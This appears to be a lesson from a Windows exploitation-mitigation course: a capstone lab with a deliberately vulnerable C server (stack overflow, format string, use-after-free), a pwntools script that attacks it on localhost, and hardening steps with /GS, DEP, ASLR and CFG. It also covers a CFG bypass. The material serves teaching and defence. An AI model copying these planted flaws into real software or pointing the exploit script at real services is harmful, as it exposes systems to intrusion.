## Day 7: Capstone Project - The Hardening Campaign

- **Goal**: Apply all learned mitigations to secure a vulnerable "legacy" Windows 10 system against known exploits.
- **Activities**:
  - **Assess**: Audit the provided vulnerable VM (Week 5 environment).
  - **Harden**: Enable DEP, ASLR, CFG, VBS, and HVCI.
  - **Verify**: Run the "Exploitation Gauntlet" from Week 5 against the hardened system.
  - **Report**: Document which exploits failed and why.

### The Challenge: SecureServer v1.0

You are given the `vuln_server` from Week 5, running on a default Windows 10 install.
Your Week 5 exploits (Stack Overflow, UAF) currently work.

**Task**:

1.  **Baseline**: Run `mitigation_audit.ps1` to confirm lack of protections.
2.  **Recompile**: Rebuild `vuln_server` with `/GS`, `/NXCOMPAT`, `/DYNAMICBASE`, `/guard:cf`, `/HIGHENTROPYVA`.
3.  **OS Hardening**: Enable VBS, HVCI, and system-wide DEP (Opt-Out).
4.  **Attack**:
    - Try `auth` exploit (Stack Overflow) -> Should fail (DEP or Stack Cookie).
    - Try `note` exploit (UAF) -> Should fail (Segment Heap/MemGC if enabled, or harder to exploit).
    - Try `echo` exploit (Format String) -> ASLR should make addresses unpredictable.

### Practical Exercise: Day 7 Capstone

**Lab 7.1: Compile and Test Vulnerable Server**

```c
// vuln_server_capstone.c - Week 5 server with multiple vulnerabilities
// Compile WITHOUT protections first:
// cl /GS- /Zi /D_CRT_SECURE_NO_WARNINGS src\vuln_server_capstone.c /Fe:bin\vuln_capstone_weak.exe /link /NXCOMPAT:NO /DYNAMICBASE:NO /DEBUG
// Then WITH protections:
// cl /GS /Zi /guard:cf /D_CRT_SECURE_NO_WARNINGS src\vuln_server_capstone.c /Fe:bin\vuln_capstone_hard.exe /link /NXCOMPAT /DYNAMICBASE /HIGHENTROPYVA /guard:cf /DEBUG

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

#define PORT 4444
#define BUFSIZE 1024  // Large recv buffer to allow overflow payloads through

// Vulnerability 1: Stack overflow in auth handler
void handle_auth(char* input) {
    char password[64];
    strcpy(password, input);  // OVERFLOW!

    if (strcmp(password, "secret123") == 0) {
        printf("[+] Auth success\n");
    } else {
        printf("[-] Auth failed\n");
    }
    fflush(stdout);
}

// Vulnerability 2: Format string
void handle_log(char* input) {
    printf("[LOG] ");
    printf(input);  // FORMAT STRING!
    printf("\n");
    fflush(stdout);
    // NOTE: On MSVCRT, %p prints bare hex (no 0x prefix)
    // and positional parameters (%N$x) are NOT supported
}

// Vulnerability 3: Use-after-free simulation
typedef struct {
    char data[64];
    void (*callback)(void);
} UserObj;

UserObj* g_user = NULL;

void safe_callback() { printf("[*] Safe callback\n"); fflush(stdout); }
void admin_callback() { printf("[!] ADMIN ACCESS GRANTED\n"); fflush(stdout); }

void handle_alloc() {
    g_user = (UserObj*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(UserObj));
    g_user->callback = safe_callback;
    printf("[+] User allocated at %p\n", g_user);
    fflush(stdout);
}

void handle_free() {
    HeapFree(GetProcessHeap(), 0, g_user);
    printf("[+] User freed (but pointer not nulled!)\n");
    fflush(stdout);
    // NOTE: g_user is now a dangling pointer
    // The pointer is NOT set to NULL — use-after-free is possible
}

void handle_use(char* input) {
    if (g_user) {
        strcpy(g_user->data, input);
        fflush(stdout);
        g_user->callback();
        // With CFG: if callback was overwritten to a valid function
        //   (like admin_callback), CFG ALLOWS it (coarse-grained!)
        // With CFG: if callback was overwritten to shellcode address,
        //   CFG BLOCKS it with exit code 0x80000003
    }
}

int main() {
    WSADATA wsa;
    SOCKET server, client;
    struct sockaddr_in addr;
    char buffer[BUFSIZE];

    WSAStartup(MAKEWORD(2,2), &wsa);
    server = socket(AF_INET, SOCK_STREAM, 0);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    bind(server, (struct sockaddr*)&addr, sizeof(addr));
    listen(server, 1);

    printf("[*] Capstone Server on port %d\n", PORT);
    printf("[*] Commands: AUTH <pass>, LOG <msg>, ALLOC, FREE, USE <data>\n");
    fflush(stdout);

    while ((client = accept(server, NULL, NULL)) != INVALID_SOCKET) {
        memset(buffer, 0, BUFSIZE);
        recv(client, buffer, BUFSIZE-1, 0);

        if (strncmp(buffer, "AUTH ", 5) == 0) handle_auth(buffer+5);
        else if (strncmp(buffer, "LOG ", 4) == 0) handle_log(buffer+4);
        else if (strncmp(buffer, "ALLOC", 5) == 0) handle_alloc();
        else if (strncmp(buffer, "FREE", 4) == 0) handle_free();
        else if (strncmp(buffer, "USE ", 4) == 0) handle_use(buffer+4);

        closesocket(client);
    }

    return 0;
}
```

**Lab 7.2: Pwntools Exploit - Test Against Hardened Server**

```python
#!/usr/bin/env python3
# capstone_exploit.py - Exploit that works WITHOUT mitigations, fails WITH
# This demonstrates Week 6 mitigations blocking Week 5 attacks

from pwn import *
import struct
import sys
import time

# Configuration
HOST = "127.0.0.1"
PORT = 4444

def exploit_stack_overflow():
    """Stack overflow - blocked by DEP + Stack Cookies"""
    print("\n" + "="*60)
    print("[EXPLOIT 1] Stack Buffer Overflow (AUTH)")
    print("="*60)

    # Shellcode (x64 Windows - calc.exe launcher pattern)
    # This is BLOCKED by DEP (cannot execute stack)
    shellcode = b"\x90" * 50  # NOP sled
    shellcode += b"\xCC" * 4  # INT3 (breakpoint for testing)

    # Overflow pattern
    offset = 64  # Buffer size
    payload = b"A" * offset
    payload += b"BBBBBBBB"  # Saved RBP (will corrupt stack cookie first!)
    payload += struct.pack("<Q", 0x41414141)  # Return address
    payload += shellcode

    try:
        io = remote(HOST, PORT, timeout=5)
        io.send(b"AUTH " + payload)
        io.close()

        print("[-] Sent overflow payload")
        print("[*] Expected result WITHOUT mitigations: Code execution")
        print("[*] Expected result WITH mitigations:")
        print("    - /GS: Process terminates (cookie corrupted)")
        print("    - DEP: Access violation if shellcode reached")
        print("    - ASLR: Return address wrong anyway")
    except Exception as e:
        print(f"[*] Connection error (server may have crashed): {e}")
        print("[+] If server crashed: Mitigation likely triggered!")

def exploit_format_string():
    """Format string info leak - ASLR makes this less useful"""
    print("\n" + "="*60)
    print("[EXPLOIT 2] Format String Information Leak (LOG)")
    print("="*60)

    # Leak stack addresses
    leak_payload = b"%p." * 20

    try:
        io = remote(HOST, PORT, timeout=5)
        io.send(b"LOG " + leak_payload)
        io.close()

        print("[*] Sent format string payload: %p.%p.%p...")
        print("[*] Without ASLR: Addresses are predictable across runs")
        print("[*] With ASLR: Addresses randomized - exploit unreliable")
        print("[*] Check server output for leaked addresses")
    except Exception as e:
        print(f"[*] Error: {e}")

def exploit_uaf():
    """Use-after-free - heap hardening makes this harder"""
    print("\n" + "="*60)
    print("[EXPLOIT 3] Use-After-Free (ALLOC/FREE/USE)")
    print("="*60)

    try:
        # Step 1: Allocate object
        io = remote(HOST, PORT, timeout=5)
        io.send(b"ALLOC")
        io.close()
        print("[1] Allocated user object")

        # Step 2: Free object (but pointer not nulled)
        io = remote(HOST, PORT, timeout=5)
        io.send(b"FREE")
        io.close()
        print("[2] Freed object (dangling pointer)")

        # Step 3: Try to reallocate with controlled data
        # On unprotected heap: might reclaim same memory
        fake_vtable = struct.pack("<Q", 0x41414141)  # Fake callback ptr
        payload = b"A" * 64 + fake_vtable

        io = remote(HOST, PORT, timeout=5)
        io.send(b"USE " + payload)
        io.close()
        print("[3] Used freed object with controlled data")

        print("[*] Without heap hardening: Callback hijacked")
        print("[*] With Segment Heap/LFH: Reallocation unpredictable")
        print("[*] With CFG + shellcode address: Call BLOCKED (exit 0x80000003)")
        print("[*] With CFG + valid function (admin_callback): Call ALLOWED!")
        print("[*]   -> CFG is coarse-grained (proven in Day 2-3)")
    except Exception as e:
        print(f"[*] Error: {e}")

def run_all_exploits():
    """Run all exploits and compare results"""
    print("="*70)
    print("CAPSTONE EXPLOIT SUITE - Mitigations Test")
    print("="*70)
    print(f"Target: {HOST}:{PORT}")
    print()
    print("Run this against TWO versions of the server:")
    print("1. Compiled WITHOUT protections (exploits should work)")
    print("2. Compiled WITH protections (exploits should fail)")
    print()

    input("Press Enter to start exploit chain...")

    exploit_stack_overflow()
    time.sleep(1)

    exploit_format_string()
    time.sleep(1)

    exploit_uaf()

    print("\n" + "="*70)
    print("RESULTS ANALYSIS")
    print("="*70)
    print("""
Document for each exploit:

| Exploit         | No Mitigations | With Mitigations | Blocking Mitigation |
|-----------------|----------------|------------------|---------------------|
| Stack Overflow  | RCE Achieved   | Crash/Block      | /GS, DEP, ASLR      |
| Format String   | Info Leaked    | Info Leaked*     | ASLR (partial)      |
| Use-After-Free  | Callback Hijack| Blocked          | CFG, Heap Hardening |

* Format string still works, but ASLR makes leaked addresses useless
  for subsequent attacks since they change each run.
""")

if __name__ == "__main__":
    run_all_exploits()
```

**Lab 7.3: Document Results**

Create a "Hardening Report" documenting:

1. Initial vulnerability state
2. Each mitigation enabled
3. Exploit test results before/after
4. Recommendations for enterprise deployment

**Testing Tips**:

- Restart the server between exploit runs (it crashes after stack overflow)
- Run exploits individually to see each result clearly:
  ```bash
  # Test one exploit at a time
  python -c "from capstone_exploit import *; exploit_stack_overflow()"
  python -c "from capstone_exploit import *; exploit_format_string()"
  python -c "from capstone_exploit import *; exploit_uaf()"
  ```
- Compare server output between weak and hardened versions
- Use `Check-Mitigations` to verify binary protections:
  ```bash
  Check-Mitigations "bin\vuln_capstone_weak.exe"
  Check-Mitigations "bin\vuln_capstone_hard.exe"
  ```

### Capstone Checklist

- [ ] `vuln_server_capstone` compiled WITHOUT protections - exploits work
- [ ] `vuln_server_capstone` recompiled WITH full mitigations
- [ ] Windows OS hardened (VBS/HVCI enabled)
- [ ] All three exploits confirmed blocked
- [ ] "Hardening Report" generated with before/after comparison

### Key Takeaways - Day 7

1. **Mitigations are layers, not walls**: No single mitigation stops everything. /GS catches
   the overflow, DEP blocks shellcode execution, ASLR makes addresses unpredictable, CFG
   validates indirect calls. Together they make exploitation exponentially harder.
2. **Default ≠ Secure**: Out-of-the-box Windows prioritizes compatibility. Many mitigations
   (VBS, HVCI, Credential Guard, ACG) must be explicitly enabled.
3. **Recompilation is the most impactful single action**: Adding `/GS /guard:cf /DYNAMICBASE
/HIGHENTROPYVA /NXCOMPAT` to the build immediately enables 5+ mitigations.
4. **CFG has a proven coarse-grained bypass**: The UAF exploit redirecting to
   `admin_callback` (a valid function) will PASS CFG validation even with
   `/guard:cf` enabled. This was proven throughout Days 2-4.
5. **Format strings still leak on Windows**: MSVCRT's `%p` outputs bare hex (no `0x` prefix)
   and does NOT support positional parameters (`%N$x`). ASLR makes leaked addresses
   per-session, but they're still useful within a single connection.
6. **Verification is mandatory**: You haven't secured it until you've tried to exploit it
   and failed. Compare exit codes: `0xC0000409` (/GS), `0x80000003` (CFG/CET),
   `0xC0000005` (DEP/access violation), `0xC0000374` (heap corruption).

### Discussion Questions

1. **Which mitigation was the most effective against the Stack Overflow exploit?**

   > /GS (stack cookies) — because it detects the overflow BEFORE the attacker gets
   > control. DEP would also block shellcode execution, but /GS terminates the process
   > at function epilogue, preventing any post-overflow actions. ASLR only helps if
   > the attacker needs to know addresses (which they do for ROP/ret2libc).

2. **Why might an organization hesitate to enable VBS/HVCI on all workstations?**

   > Performance impact (2-15%), driver compatibility issues (unsigned/non-compliant
   > drivers break), legacy application support, hardware requirements (VT-x, TPM),
   > and the inability to easily roll back if problems arise. VBS with UEFI lock
   > cannot be disabled without clearing the UEFI firmware.

3. **How does enabling ASLR affect the reliability of your exploits?**

   > Exploits using hardcoded addresses become unreliable — they work on one boot
   > but fail on the next. This forces attackers to add an information leak step
   > (demonstrated in Day 2 Technique 1 with format strings). The exploit chain
   > becomes: leak addresses -> calculate offsets -> deliver payload. This extra step
   > increases complexity and detection opportunity.

4. **If you could only enable ONE mitigation, which would it be and why?**
   > DEP (/NXCOMPAT) — because it eliminates the simplest and most common exploit
   > primitive: "overflow buffer, jump to shellcode." Without DEP, any buffer overflow
   > that controls the instruction pointer is immediately exploitable. With DEP,
   > attackers must use ROP or ret2libc, which requires knowing library addresses
   > (defeated by ASLR) and is much more complex. DEP is also the lowest-overhead
   > mitigation (hardware NX bit, no performance cost).

